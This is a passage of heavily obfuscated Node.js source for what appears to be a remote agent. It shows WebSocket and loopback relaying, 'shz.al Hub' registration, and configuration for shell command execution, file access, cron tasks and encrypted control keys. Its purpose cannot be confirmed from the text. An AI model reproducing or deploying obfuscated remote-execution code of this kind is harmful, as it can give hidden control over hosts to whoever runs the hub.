    }), j['on'](c[dX(0x91e)], (r, s) => {
        const dZ = dX;
        if (c[dZ(0x73c)](a['readyState'], a[dZ(0x66a)]))
            a[dZ(0x871)](r, { 'binary': s });
    }), j['on'](c[dX(0x480)], () => {
        const e0 = dX;
        try {
            a[e0(0x76b)](0x3e8, 'closed');
        } catch (r) {
        }
    }), j['on'](dX(0xfcc), () => {
        try {
            a['close'](0x3f3, c['wnNXe']);
        } catch (r) {
        }
    }), a['on'](dX(0x769), (r, s) => {
        const e1 = dX;
        if (m)
            j[e1(0x871)](r, { 'binary': s });
        else
            l['push']({
                'data': r,
                'binary': s
            });
    }), a['on'](c['VZPZm'], () => {
        const e2 = dX;
        try {
            j[e2(0x76b)]();
        } catch (r) {
        }
    }), a['on'](dX(0xfcc), () => {
        const e3 = dX;
        try {
            j[e3(0x76b)]();
        } catch (r) {
        }
    });
}
function a0ao(a, b) {
    const e4 = a0d9, c = new Error(b);
    return c[e4(0x223)] = a, c;
}
function a0ap(a, b, c, d, f, g, h = {}) {
    const e5 = a0d9, i = {
            'mIifL': function (j, k) {
                return j(k);
            },
            'BZIYq': function (j, k, l) {
                return j(k, l);
            },
            'hiDBu': e5(0xdd1),
            'RXnXw': e5(0xe83),
            'zIcJH': e5(0xdc9),
            'dpeFm': e5(0xfcc),
            'PeRQl': e5(0xed2),
            'XgpGe': function (j, k) {
                return j(k);
            },
            'KdntE': function (j, k) {
                return j === k;
            }
        };
    return new Promise((j, k) => {
        const e7 = e5, l = {
                'XKpfs': function (t, v) {
                    const e6 = a0b;
                    return i[e6(0x7ed)](t, v);
                },
                'Wymvl': function (t, v) {
                    return t(v);
                },
                'rTUgk': i[e7(0xe08)]
            };
        let m;
        try {
            m = new URL(b);
        } catch (t) {
            return i['XgpGe'](k, t);
        }
        const n = i['KdntE'](m[e7(0x971)], e7(0xf9e)) ? a0h : a0g;
        let o = ![], p = null;
        const q = v => {
                const e8 = e7;
                if (o)
                    return;
                o = !![];
                if (p)
                    l[e8(0x8b1)](clearTimeout, p);
                j(v);
            }, r = v => {
                const e9 = e7;
                if (o)
                    return;
                o = !![];
                if (p)
                    i[e9(0x95c)](clearTimeout, p);
                k(v);
            }, s = n['request'](m, {
                'method': a,
                'headers': c
            }, v => {
                const eb = e7, w = {
                        'Pozmz': function (A, B) {
                            return A > B;
                        },
                        'hJriP': function (A, B, C) {
                            const ea = a0b;
                            return i[ea(0xdbc)](A, B, C);
                        },
                        'MFsVm': i[eb(0x6da)]
                    }, x = [];
                let y = 0x0, z = ![];
                v['on'](i[eb(0x16f)], A => {
                    const ec = eb;
                    if (z || o)
                        return;
                    y += A['length'];
                    if (w[ec(0xce4)](y, g)) {
                        z = !![], r(h[ec(0x960)] || w[ec(0x6ef)](a0ao, w['MFsVm'], ec(0x7a7))), v[ec(0x28a)]();
                        return;
                    }
                    x[ec(0xb66)](A);
                }), v['on'](i[eb(0x6c7)], () => {
                    const ed = eb;
                    if (z || o)
                        return;
                    l[ed(0x8b1)](q, {
                        'status': v[ed(0xafa)],
                        'headers': v[ed(0x57f)],
                        'body': Buffer[ed(0x83f)](x)
                    });
                }), v['on'](i[eb(0x20d)], r);
            });
        if (h[e7(0xffb)]) {
            p = setTimeout(() => {
                const ee = e7;
                l['Wymvl'](r, h[ee(0xe5b)] || new Error(l[ee(0x723)])), s[ee(0x28a)]();
            }, h[e7(0xffb)]);
            if (p[e7(0x4b0)])
                p[e7(0x4b0)]();
        }
        s[e7(0x9f2)](f, () => {
            const ef = e7;
            i[ef(0x95c)](r, h[ef(0xe5b)] || new Error(i['PeRQl'])), s[ef(0x28a)]();
        }), s['on'](i[e7(0x20d)], r);
        if (d && d[e7(0xc54)])
            s[e7(0xc5e)](d);
        s[e7(0xdc9)]();
    });
}
function a0aq(a) {
    const eg = a0d9, b = {
            'YyeHu': function (d, f) {
                return d(f);
            },
            'QctpQ': function (d, f) {
                return d === f;
            },
            'ZMNBn': 'content-length',
            'AqBBq': 'access-control-'
        }, c = {};
    for (const [d, f] of Object[eg(0x77e)](a || {})) {
        const g = b[eg(0x700)](String, d)[eg(0x544)]();
        if (a0a5['has'](g) || b[eg(0x41a)](g, b[eg(0xc00)]) || g[eg(0x1ba)](b[eg(0x79c)]))
            continue;
        c[d] = f;
    }
    return c;
}
function a0ar(a) {
    const eh = a0d9, b = {
            'CZFfw': function (m, n, o) {
                return m(n, o);
            },
            'njGEt': eh(0x4c8),
            'gjmAi': function (m, n) {
                return m > n;
            },
            'tFNdA': function (m, n, o) {
                return m(n, o);
            },
            'pAIVU': eh(0xdd1),
            'QDiDK': function (m, n) {
                return m + n;
            },
            'LVWNU': eh(0xb2b)
        }, {
            port: c,
            whitelist: d,
            path: f,
            query: g,
            headers: h,
            body: i,
            maxBody: j
        } = a;
    if (d && !d[eh(0x152)](c))
        throw b[eh(0xd2e)](a0ao, b[eh(0x5af)], eh(0xd7d)[eh(0x83f)](c, eh(0xc26)));
    if (i && b[eh(0xd51)](i['length'], j))
        throw b[eh(0xc6d)](a0ao, b[eh(0x6db)], eh(0x9e1)['concat'](j, eh(0x8a5)));
    const k = 'http://127.0.0.1:'[eh(0x83f)](c)[eh(0x83f)](f)['concat'](g ? b['QDiDK']('?', g) : ''), l = a0ab(h);
    if (a[eh(0x7f0)])
        l[b['LVWNU']] = a['forwardedFor'];
    return {
        'url': k,
        'headers': l
    };
}
function a0as(a, b, c, d, f) {
    const ei = a0d9, g = {
            'Mpbyc': function (h, i) {
                return h(i);
            },
            'arQMZ': function (h, i) {
                return h === i;
            },
            'jRmiq': ei(0xf9e)
        };
    return new Promise((h, i) => {
        const ej = ei;
        let j;
        try {
            j = new URL(b);
        } catch (m) {
            return i(m);
        }
        const k = g[ej(0x7c1)](j[ej(0x971)], g[ej(0x309)]) ? a0h : a0g, l = k[ej(0xfc5)](j, {
                'method': a,
                'headers': c
            }, n => {
                const ek = ej;
                g[ek(0x7d8)](h, {
                    'status': n[ek(0xafa)],
                    'headers': n[ek(0x57f)],
                    'res': n
                });
            });
        l['setTimeout'](f, () => l[ej(0x28a)](new Error('loopback\x20request\x20timeout'))), l['on'](ej(0xfcc), i);
        if (d && d['length'])
            l[ej(0xc5e)](d);
        l[ej(0xdc9)]();
    });
}
async function a0at(a) {
    const el = a0d9, b = {
            'GcSWz': function (n, o) {
                return n(o);
            },
            'OESac': function (n, o, p, q, r, s, t) {
                return n(o, p, q, r, s, t);
            },
            'zkWRL': el(0xd07),
            'UpLSw': function (n, o) {
                return n > o;
            },
            'xOTZS': function (n, o, p) {
                return n(o, p);
            },
            'sbZxP': el(0xdd1)
        }, {
            url: c,
            headers: d
        } = b[el(0x1ff)](a0ar, a), {
            port: f,
            maxBody: g,
            relayTimeout: h,
            method: i,
            body: j
        } = a;
    let k, l, m;
    try {
        a[el(0xbba)] ? {
            status: k,
            headers: l,
            body: m
        } = await a['requestFn'](i, c, d, j) : {
            status: k,
            headers: l,
            body: m
        } = await b[el(0x1006)](a0ap, i, c, d, j, h, g);
    } catch (n) {
        if (n && n[el(0x223)])
            throw n;
        throw a0ao(b[el(0x921)], b[el(0x1ff)](String, n && n[el(0x769)] || n)[el(0x47b)](0x0, 0x12c));
    }
    if (b[el(0x6cb)](m[el(0xc54)], g))
        throw b[el(0x6ba)](a0ao, b['sbZxP'], el(0x574)[el(0x83f)](g, '\x20字节)'));
    return {
        'status': k,
        'headers': l,
        'body': m
    };
}
function a0au(a) {
    const em = a0d9, b = {
            'fyONE': function (f, g) {
                return f(g);
            },
            'dZBKU': function (f, g) {
                return f || g;
            },
            'ycFzJ': em(0x27c),
            'XdQoJ': function (f, g) {
                return f < g;
            },
            'EkRZD': function (f, g) {
                return f + g;
            }
        }, c = b[em(0xb90)](String, b[em(0x351)](a, ''))['trim'](), d = c[em(0xe0a)](b[em(0x5eb)]);
    return b[em(0x1062)](d, 0x0) ? '' : c[em(0x47b)](b[em(0x4cc)](d, 0x3))['split']('/')[0x0];
}
function a0av(a) {
    const en = a0d9, b = {
            'QrmZP': function (m, n) {
                return m(n);
            },
            'Lzpfg': function (m, n) {
                return m || n;
            },
            'qvUem': function (m, n) {
                return m + n;
            },
            'aiPRe': function (m, n) {
                return m !== n;
            },
            'RNEuJ': en(0x7e9)
        }, c = b[en(0x2e7)](String, b[en(0x9a7)](a, ''))[en(0x5b0)](), d = c[en(0x8d4)](/[\t\r\n]/g, ''), f = d[en(0x989)](/^[A-Za-z][A-Za-z0-9+.-]*:([\s\S]*)$/);
    if (!f)
        return ![];
    let g = f[0x1];
    if (g[en(0x1ba)]('//'))
        g = g['slice'](0x2);
    const h = g[en(0x989)](/^([^/?#\\]*)([\s\S]*)$/);
    if (!h)
        return ![];
    const i = h[0x1], j = h[0x2], k = i[en(0x47b)](b['qvUem'](i[en(0xf60)]('@'), 0x1)), l = k[en(0xa6a)](':', 0x1)[0x0][en(0x5b0)]()[en(0x544)]();
    if (b[en(0x3d3)](l, b['RNEuJ']))
        return ![];
    return j[en(0x1ba)]('/~') || j[en(0x152)]('\x5c') && g[en(0x152)]('/~');
}
function a0aw(a) {
    const eo = a0d9, b = {
            'zRtUM': function (d, f) {
                return d(f);
            },
            'QfYBH': function (d, f) {
                return d || f;
            }
        }, c = b['zRtUM'](String, b['QfYBH'](a, ''))[eo(0x5b0)]();
    return b[eo(0x333)](a0av, c) ? c : c[eo(0x8d4)](/\/+$/, '');
}
function a0ax(a) {
    const ep = a0d9, b = {
            'IyLSk': function (j, k) {
                return j(k);
            },
            'JzthZ': function (j, k) {
                return j || k;
            },
            'YeWFJ': ep(0x81a),
            'IUTjR': ep(0xb09),
            'Fzezz': ep(0x770),
            'lisSR': function (j, k) {
                return j !== k;
            },
            'QMFXR': ep(0x332),
            'TnIqn': function (j, k) {
                return j + k;
            },
            'JwUaW': ep(0x7e9),
            'Fqfuu': function (j, k) {
                return j !== k;
            },
            'gESPD': function (j, k) {
                return j(k);
            },
            'GSwgu': function (j, k) {
                return j !== k;
            },
            'ebWpU': ep(0x713),
            'HVCFp': ep(0xe65)
        };
    if (!b['IyLSk'](a0av, a))
        return null;
    const c = String(b[ep(0xf9d)](a, ''))['trim']();
    if (c[ep(0x152)]('\x5c'))
        return b[ep(0x1e2)];
    if (/[\s\u0000-\u001f\u007f-\u009f]/[ep(0xf92)](c))
        return b[ep(0x737)];
    if (c[ep(0x152)]('?') || c[ep(0x152)]('#'))
        return b['Fzezz'];
    const d = c['match'](/^([A-Za-z][A-Za-z0-9+.-]*):\/\/([^/?#]+)(\/[^?#]*)$/);
    if (!d)
        return ep(0x713);
    const f = d[0x1][ep(0x544)](), g = d[0x2], h = d[0x3];
    if (b['lisSR'](f, 'https'))
        return ep(0x428);
    if (g[ep(0x152)]('@'))
        return b['QMFXR'];
    if (g[ep(0x152)](':')) {
        const j = g[ep(0xe0a)](':'), k = g[ep(0x47b)](0x0, j)['toLowerCase'](), l = g[ep(0x47b)](b[ep(0xabf)](j, 0x1));
        if (k !== b[ep(0xa1e)] || !/^[0-9]+$/[ep(0xf92)](l))
            return ep(0x713);
        if (l[ep(0xc54)] > 0x5 || b[ep(0xd9e)](b[ep(0xf54)](Number, l), 0x1bb))
            return 'shz.al\x20Hub\x20别名端口必须为\x20443';
    } else {
        if (b[ep(0x6f5)](g['toLowerCase'](), b[ep(0xa1e)]))
            return b[ep(0x233)];
    }
    if (!h[ep(0x1ba)]('/~'))
        return b[ep(0x233)];
    const i = h['slice'](0x2);
    if (i[ep(0xc54)] < 0x3)
        return b['HVCFp'];
    if (!/^[A-Za-z0-9+_\-*$=@,;/\[\]]+$/['test'](i))
        return 'shz.al\x20Hub\x20别名名称含非法字符';
    return null;
}
function a0ay(a) {
    const eq = a0d9, b = {
            'beYQv': function (h, i) {
                return h == i;
            },
            'cyCQu': function (h, i) {
                return h > i;
            },
            'zBYOy': eq(0x7aa),
            'RLCGo': 'shz.al\x20响应中的\x20Hub\x20地址必须以\x20http://\x20或\x20https://\x20开头',
            'EzTxY': eq(0x7a3),
            'afLWn': eq(0xe54),
            'aYLAL': eq(0xa90),
            'xgdSQ': 'http:',
            'ZOkBi': eq(0xf9e),
            'ObRGp': eq(0x214),
            'kbxCL': function (h, i) {
                return h(i);
            },
            'dfGUR': eq(0x7ce),
            'pafqA': eq(0xc2a),
            'CDyhJ': function (h, i) {
                return h < i;
            },
            'FfcoB': function (h, i) {
                return h(i);
            },
            'QLhSc': eq(0xd2d),
            'DlnDn': function (h, i) {
                return h !== i;
            },
            'ZDtOg': 'shz.al\x20响应中的\x20Hub\x20地址\x20host\x20非法'
        }, c = String(b[eq(0x5c5)](a, null) ? '' : a)['trim']();
    if (!c)
        throw new Error(eq(0x771));
    if (b['cyCQu'](c[eq(0xc54)], 0x200))
        throw new Error(b[eq(0xdf2)]);
    if (!/^https?:\/\//[eq(0xf92)](c))
        throw new Error(b[eq(0xbd0)]);
    if (c['includes']('\x5c') || /[\s\u0000-\u001f\u007f-\u009f]/[eq(0xf92)](c))
        throw new Error(b[eq(0x8ea)]);
    if (c[eq(0x152)]('?') || c[eq(0x152)]('#'))
        throw new Error(b[eq(0xd4a)]);
    let d;
    try {
        d = new URL(c);
    } catch (h) {
        throw new Error(b[eq(0x1064)]);
    }
    if (d[eq(0x971)] !== b['xgdSQ'] && d['protocol'] !== b[eq(0xd12)])
        throw new Error(b[eq(0xd20)]);
    const f = b['kbxCL'](a0au, c);
    if (f['includes']('@'))
        throw new Error(b[eq(0x3bd)]);
    if (f[eq(0x102a)](':'))
        throw new Error(b[eq(0xd42)]);
    if (d['port'] && (b[eq(0x7c8)](b['FfcoB'](Number, d[eq(0x5c6)]), 0x1) || b['kbxCL'](Number, d['port']) > 0xffff))
        throw new Error(b[eq(0x6a4)]);
    let g;
    if (f[eq(0x1ba)]('[')) {
        const i = f[eq(0xe0a)](']');
        g = i < 0x0 ? '' : f['slice'](0x1, i);
        if (b['DlnDn'](a0i[eq(0xff0)](g), 0x6))
            throw new Error(b['ZDtOg']);
    } else {
        g = f[eq(0xa6a)](':', 0x1)[0x0];
        if (!a0i['isIP'](g) && (b[eq(0x64f)](g['length'], 0xfd) || !g[eq(0xa6a)]('.')[eq(0xe52)](j => /^[A-Za-z0-9](?:[A-Za-z0-9-]{0,61}[A-Za-z0-9])?$/[eq(0xf92)](j))))
            throw new Error(b['ZDtOg']);
    }
    return c['replace'](/\/+$/, '');
}
function a0az(a) {
    const er = a0d9, b = {
            'QLBgg': function (g, h) {
                return g(h);
            },
            'Xhaza': function (g, h) {
                return g(h);
            },
            'TJZoT': er(0x374),
            'UWkXa': function (g, h) {
                return g !== h;
            },
            'RqJAT': er(0x92a),
            'TiwJK': 'identity',
            'uWsgx': er(0x652)
        }, c = {};
    for (const [g, h] of Object[er(0x77e)](a || {}))
        c[String(g)['toLowerCase']()] = b['QLBgg'](String, h);
    const d = b[er(0x156)](String, c[b[er(0x49b)]] || '')['split'](';', 0x1)[0x0][er(0x5b0)]()[er(0x544)](), f = String(c[er(0x18c)] || '')['trim']()[er(0x544)]();
    if (b['UWkXa'](d, er(0x213)))
        throw new Error(b['RqJAT']);
    if (f && b[er(0xf75)](f, b[er(0x7a4)]))
        throw new Error(b[er(0x149)]);
}
async function a0aA(a, b = null) {
    const es = a0d9, c = {
            'RUKgd': es(0x707),
            'njOaw': es(0x301),
            'lEYnN': function (j, k, l, m, n) {
                return j(k, l, m, n);
            },
            'TpZnL': function (j, k, l, m, n, o, p, q) {
                return j(k, l, m, n, o, p, q);
            },
            'DwVuE': es(0x249),
            'EnPxl': es(0x4df),
            'sxPgL': function (j, k) {
                return j(k);
            },
            'cBkwg': function (j, k) {
                return j !== k;
            },
            'kiTWq': function (j, k) {
                return j(k);
            },
            'zmmYD': es(0xbcc),
            'qsoJJ': 'utf-8',
            'DakbC': es(0xdf5),
            'nLGvR': function (j, k) {
                return j(k);
            }
        }, d = a0ax(a);
    if (d)
        throw new Error(d);
    const f = {
        'Accept': es(0x213),
        'User-Agent': c[es(0x2b9)],
        'Accept-Encoding': c[es(0xd0b)]
    };
    let g;
    try {
        g = b ? await c[es(0xc4a)](b, es(0x249), a, f, null) : await c[es(0x415)](a0ap, c[es(0xcea)], a, f, null, 0x3a98, 0x1000, {
            'totalTimeoutMs': 0x3a98,
            'timeoutError': new Error(c['EnPxl']),
            'tooLargeError': new Error('响应超过\x204096\x20字节')
        });
    } catch (j) {
        throw new Error(es(0xda8) + c[es(0x39d)](String, j && j[es(0x769)] || j)[es(0x47b)](0x0, 0xc8));
    }
    if (c['cBkwg'](g[es(0x13d)], 0xc8))
        throw new Error(es(0xd64)[es(0x83f)](g[es(0x13d)]));
    c[es(0x42a)](a0az, g[es(0x57f)]);
    const h = Buffer[es(0xca5)](g['body'] || '');
    if (h['length'] > 0x1000)
        throw new Error(c[es(0xa82)]);
    let i;
    try {
        i = new TextDecoder(c[es(0xcab)], { 'fatal': !![] })[es(0x106e)](h);
    } catch (k) {
        throw new Error(c['DakbC']);
    }
    return c[es(0x387)](a0ay, i);
}
function a0aB(a, c, d) {
    const et = a0d9, g = {
            'TZcbr': function (k, l) {
                return k || l;
            },
            'ZoDEW': function (k, l) {
                return k * l;
            }
        }, h = Math['max'](0.5, c || 0x2), i = Math[et(0x37f)](h, g[et(0xe7a)](d, 0x3c)), j = Math[et(0x37f)](0x0, a - 0x1);
    return Math[et(0x100f)](g[et(0x9ae)](h, Math['pow'](0x2, j)), i);
}
function a0aC() {
    const eu = a0d9;
    return new Date()[eu(0xc78)]()[eu(0x8d4)](/\.\d{3}Z$/, 'Z');
}
class a0aD extends Error {
    constructor(a, b) {
        const ev = a0d9, c = { 'ibyXf': 'HubRegisterError' };
        super('['[ev(0x83f)](a, ']\x20')['concat'](b)), this[ev(0x94b)] = c[ev(0x35a)], this[ev(0x503)] = a;
    }
}
class a0aE {
    static [a0d9(0xd5c)] = parseInt(process.env.EXEC_TIMEOUT || '30');
    static ['EXEC_SHELL_MODE'] = (process.env.EXEC_SHELL || a0d9(0xf0e))[a0d9(0x544)]() === a0d9(0xf0e);
    static [a0d9(0x6c0)] = (process.env.DEBUG || a0d9(0x96e))['toLowerCase']() === a0d9(0xf0e);
    static [a0d9(0xbca)] = parseInt(process.env.TIMESTAMP_WINDOW || '3600');
    static [a0d9(0x48a)] = parseInt(process.env.LOG_LEVEL || (this[a0d9(0x6c0)] ? '0' : '3'), 0xa);
    static ['ECDSA_PUBLIC_KEY_PEM'] = a0aE[a0d9(0xf4e)](a0d9(0x83d), a0d9(0xc3c)) || 'ECDSA公钥内容';
    static ['ECIES_PUBLIC_KEY_PEM'] = a0aE[a0d9(0xf4e)](a0d9(0xea2), 'keys/agent_ecies_pub.b64') || 'ECIES公钥内容';
    static ['TEMPKEY_DEFAULT_TTL_HOURS'] = parseInt(process.env.TEMPKEY_TTL || '24', 0xa);
    static [a0d9(0x151)] = parseInt(process.env.TEMPKEY_MAX_TTL || a0d9(0x26b), 0xa);
    static ['FILE_ROOT'] = a0T();
    static [a0d9(0x103e)] = parseInt(process.env.MAX_UPLOAD_SIZE || a0d9(0x9c8));
    static ['FOLLOW_SYMLINKS'] = (process.env.FOLLOW_SYMLINKS || a0d9(0x96e))[a0d9(0x544)]() === 'true';
    static [a0d9(0xfda)] = Number[a0d9(0xb14)](parseInt(process.env.DOWNLOAD_ENCRYPT_MAX || a0d9(0xc72), 0xa)) ? parseInt(process.env.DOWNLOAD_ENCRYPT_MAX || a0d9(0xc72), 0xa) : 0x400000;
    static [a0d9(0x8dc)] = (process.env.FILE_AUDIT_LOG || a0d9(0xf0e))[a0d9(0x544)]() === a0d9(0xf0e);
    static [a0d9(0x4b8)] = !![];
    static [a0d9(0x1b9)] = [];
    static [a0d9(0x69c)] = {};
    static [a0d9(0xdad)] = ![];
    static [a0d9(0xaaa)] = parseInt(process.env.TASK_TIMEOUT || a0d9(0x623));
    static [a0d9(0xe32)] = parseInt(process.env.CRON_INTERVAL || '30');
    static [a0d9(0xd32)] = [];
    static [a0d9(0x690)] = [];
    static ['MAX_TASK_LOG_SIZE'] = parseInt(process.env.MAX_TASK_LOG || a0d9(0x264));
    static [a0d9(0x76d)] = process.env.HOST || '0.0.0.0';
    static [a0d9(0x563)] = parseInt(process.env.KPORT || process.env.PORT || process.env.SERVER_PORT || a0d9(0x42c));
    static [a0d9(0x17d)] = ((() => {
        const ew = a0d9, a = (process.env.KMODE || '0')[ew(0x5b0)]();
        return /^2q(?:uic)?$/i['test'](a) ? '2' : a || '0';
    })());
    static [a0d9(0x8ca)] = /^2q(?:uic)?$/i['test']((process.env.KMODE || '')[a0d9(0x5b0)]());
    static [a0d9(0x70d)] = (process.env.KNAME || '')[a0d9(0x5b0)]();
    static [a0d9(0xc03)] = (process.env.KNAME_KEY || '')[a0d9(0x5b0)]();
    static [a0d9(0x868)] = process.env.KPATH || '';
    static [a0d9(0xe33)] = a0aw(process.env.KHUB || '');
    static ['KHUB_PUBLIC_URL'] = (process.env.KHUB_PUBLIC_URL || '')[a0d9(0x5b0)]()[a0d9(0x8d4)](/\/+$/, '');
    static [a0d9(0x1d0)] = a0a6(process.env.KHUB_PORTS || '');
    static [a0d9(0x3f5)] = a0a6(process.env.KPROXY_PORTS || '');
    static [a0d9(0xc37)] = parseFloat(process.env.KISAMA_HUB_RETRY_BASE_SECONDS || '2') || 0x2;
    static [a0d9(0x87e)] = parseFloat(process.env.KISAMA_HUB_RETRY_MAX_SECONDS || '60') || 0x3c;
    static [a0d9(0x2c7)] = parseFloat(process.env.KISAMA_HUB_PING_INTERVAL || '20') || 0x14;
    static [a0d9(0xa99)] = parseFloat(process.env.KISAMA_HUB_RELAY_TIMEOUT || '60') || 0x3c;
    static ['KISAMA_HUB_MAX_BODY'] = parseInt(process.env.KISAMA_HUB_MAX_BODY || String(0x40 * 0x400 * 0x400), 0xa) || 0x40 * 0x400 * 0x400;
    static ['DNS_MODE'] = (process.env.KISAMA_DNS || a0d9(0xb42))[a0d9(0x5b0)]()[a0d9(0x544)]();
    static [a0d9(0x89d)] = (process.env.KISAMA_DOH_SERVERS || '')[a0d9(0x5b0)]();
    static [a0d9(0xb9e)] = [
        a0d9(0xec5),
        a0d9(0xb68),
        a0d9(0x5bf)
    ];
    static [a0d9(0x4a2)] = process.env.AGENT_VERSION || a0d9(0x4ea);
    static [a0d9(0xbd2)] = a0k[a0d9(0x7bb)](0x20)[a0d9(0x43a)](a0d9(0x66e));
    static [a0d9(0xfb7)] = a0a2['generatePair']();
    static [a0d9(0xc1f)]() {
        const ex = a0d9, a = {
                'zjLtB': 'base64',
                'oVxTq': ex(0x704)
            };
        return a0k[ex(0x16e)](ex(0xac8), Buffer[ex(0xca5)](this[ex(0xbd2)], a[ex(0x716)]))['update'](a[ex(0x3f9)])[ex(0x61c)](a[ex(0x716)]);
    }
    static [a0d9(0x587)]() {
        const ey = a0d9, a = {
                'orzIv': ey(0x66e),
                'XvhPs': ey(0x8fe)
            }, b = a0a2[ey(0xdc8)]();
        this[ey(0xfb7)]['control'] = b[ey(0xfc8)], this['NOISE_KEY'][ey(0xb24)][ey(0x9f1)] = b['control'][ey(0x977)], this['SESSION_KEY'] = a0k[ey(0x7bb)](0x20)[ey(0x43a)](a['orzIv']), this[ey(0xaa4)] = null, this[ey(0xc44)] = 0x0, a0R[ey(0x585)](a[ey(0x905)]);
    }
    static ['NOISE_KEY'] = {
        'controller': { 'private': this[a0d9(0xfb7)][a0d9(0xfc8)]['private_b64'] },
        'agent': { 'public': this[a0d9(0xfb7)][a0d9(0x307)]['public_b64'] }
    };
    static [a0d9(0x67c)] = 0xe10;
    static [a0d9(0x3b9)] = 0x1e;
    static [a0d9(0xaba)] = 0x3c;
    static [a0d9(0xbbf)] = 0x1e;
    static [a0d9(0x202)] = null;
    static ['_baseinfo_p_promise'] = null;
    static [a0d9(0x3c2)] = null;
    static [a0d9(0x331)] = 0x0;
    static ['_baseinfo_local_fail_time'] = 0x0;
    static [a0d9(0x2cc)] = null;
    static ['_baseinfo_net_cache'] = null;
    static [a0d9(0xad5)] = 0x0;
    static ['_baseinfo_net_fail_time'] = 0x0;
    static [a0d9(0x5ff)] = null;
    static [a0d9(0xaa4)] = null;
    static ['_status_cache_time'] = 0x0;
    static [a0d9(0xbe1)] = null;
    static ['_baseInfoNowMs']() {
        const ez = a0d9, a = {
                'rqRRL': function (b, c) {
                    return b(c);
                },
                'GULgG': function (b, c) {
                    return b / c;
                }
            };
        return a[ez(0xe47)](Number, a['GULgG'](process['hrtime'][ez(0xd18)](), 0xf4240n));
    }
    static ['_cloneBaseInfoPart'](a) {
        return a ? { ...a } : null;
    }
    static async [a0d9(0xab1)]() {
        const eA = a0d9;
        if (this['_baseinfo_p_cache'])
            return this[eA(0x4f9)](this['_baseinfo_p_cache']);
        return !this[eA(0xd88)] && (this[eA(0xd88)] = new a0aP()[eA(0x2f2)]()[eA(0x92f)](a => {
            const eB = eA;
            return a0R[eB(0xac2)](eB(0x2ea)[eB(0x83f)](a['message']), 0x1), a0aP[eB(0xfaf)]();
        })[eA(0xdcb)](a => {
            const eC = eA;
            return this[eC(0x202)] = a, a;
        })[eA(0x3b4)](() => {
            const eD = eA;
            this[eD(0xd88)] = null;
        })), this['_cloneBaseInfoPart'](await this[eA(0xd88)]);
    }
    static async [a0d9(0x78b)](a) {
        const eE = a0d9, b = {
                'lmaNJ': function (d, f) {
                    return d < f;
                },
                'NtUob': function (d, f) {
                    return d - f;
                },
                'ZJYCz': function (d, f) {
                    return d * f;
                },
                'sZBlP': function (d, f) {
                    return d < f;
                },
                'SGKxF': function (d, f) {
                    return d - f;
                }
            }, c = this[eE(0xf82)]();
        if (this[eE(0x3c2)] && b[eE(0x106f)](b[eE(0xf25)](c, this[eE(0x331)]), b[eE(0x5a9)](this[eE(0x3b9)], 0x3e8)))
            return this[eE(0x4f9)](this[eE(0x3c2)]);
        if (this[eE(0x490)] && b[eE(0xfa0)](b[eE(0xce7)](c, this[eE(0x490)]), b[eE(0x5a9)](this[eE(0xaba)], 0x3e8)))
            return this[eE(0x4f9)](this['_baseinfo_local_cache'] || a0aP[eE(0x772)]());
        return !this[eE(0x2cc)] && (this[eE(0x2cc)] = new a0aP()[eE(0xc2f)](a)['then'](d => {
            const eF = eE;
            return this[eF(0x3c2)] = d, this[eF(0x331)] = this[eF(0xf82)](), this['_baseinfo_local_fail_time'] = 0x0, d;
        })[eE(0x92f)](d => {
            const eG = eE;
            return a0R[eG(0xac2)](eG(0x242)[eG(0x83f)](d[eG(0x769)]), 0x1), this['_baseinfo_local_fail_time'] = this[eG(0xf82)](), this[eG(0x3c2)] || a0aP[eG(0x772)]();
        })['finally'](() => {
            const eH = eE;
            this[eH(0x2cc)] = null;
        })), this['_cloneBaseInfoPart'](await this[eE(0x2cc)]);
    }
    static async [a0d9(0xd75)]() {
        const eI = a0d9, a = {
                'nkaMi': function (c, d) {
                    return c < d;
                },
                'OIIvL': function (c, d) {
                    return c - d;
                },
                'Mjhkc': function (c, d) {
                    return c * d;
                },
                'DKkGO': function (c, d) {
                    return c * d;
                }
            }, b = this[eI(0xf82)]();
        if (this[eI(0xea4)] && a[eI(0xd82)](a[eI(0x979)](b, this['_baseinfo_net_time']), a[eI(0x76a)](this[eI(0x67c)], 0x3e8)))
            return this[eI(0x4f9)](this[eI(0xea4)]);
        if (this['_baseinfo_net_fail_time'] && a[eI(0xd82)](a['OIIvL'](b, this[eI(0x423)]), a['DKkGO'](this[eI(0xaba)], 0x3e8)))
            return this[eI(0x4f9)](this[eI(0xea4)] || a0aP['netFallback']());
        return !this[eI(0x5ff)] && (this[eI(0x5ff)] = new a0aP()['collectNetInfo']()[eI(0xdcb)](c => {
            const eJ = eI;
            return this[eJ(0xea4)] = c, this[eJ(0xad5)] = this[eJ(0xf82)](), this[eJ(0x423)] = 0x0, c;
        })[eI(0x92f)](c => {
            const eK = eI;
            return a0R[eK(0xac2)](eK(0xc8a)['concat'](c[eK(0x769)]), 0x1), this[eK(0x423)] = this[eK(0xf82)](), this[eK(0xea4)] || a0aP['netFallback']();
        })[eI(0x3b4)](() => {
            const eL = eI;
            this[eL(0x5ff)] = null;
        })), this[eI(0x4f9)](await this[eI(0x5ff)]);
    }
    static [a0d9(0xf4e)](a, b) {
        const eM = a0d9, c = { 'mPUqA': eM(0xec2) }, d = process.env[a];
        if (d)
            return d;
        const f = a0o['join'](__dirname, b);
        if (a0l['existsSync'](f))
            try {
                return a0l[eM(0x976)](f, c['mPUqA'])[eM(0x5b0)]();
            } catch (g) {
            }
        return '';
    }
    static [a0d9(0x416)]() {
        const eN = a0d9, a = {
                'HUllN': function (b, c) {
                    return b > c;
                },
                'WHqRM': eN(0xdee),
                'uAsTD': '\x0a💡\x20解决方法:'
            };
        if (!this[eN(0x6c0)]) {
            const b = [];
            !this['ECDSA_PUBLIC_KEY_PEM'] && b['push'](eN(0x9b7));
            !this['ECIES_PUBLIC_KEY_PEM'] && b[eN(0xb66)](eN(0xe07));
            if (a[eN(0x34f)](b[eN(0xc54)], 0x0)) {
                const c = a[eN(0x821)][eN(0xa6a)]('|');
                let d = 0x0;
                while (!![]) {
                    switch (c[d++]) {
                    case '0':
                        a0R[eN(0xac2)](eN(0x8df));
                        continue;
                    case '1':
                        b[eN(0x764)](f => a0R[eN(0xfcc)](eN(0x641)[eN(0x83f)](f)));
                        continue;
                    case '2':
                        a0R['error'](eN(0xeea));
                        continue;
                    case '3':
                        a0R[eN(0xac2)](a['uAsTD']);
                        continue;
                    case '4':
                        process[eN(0x1ce)](0x1);
                        continue;
                    case '5':
                        a0R['debug'](eN(0xed7));
                        continue;
                    }
                    break;
                }
            }
        }
    }
    static [a0d9(0xfca)](a = {}) {
        const eO = a0d9, b = {
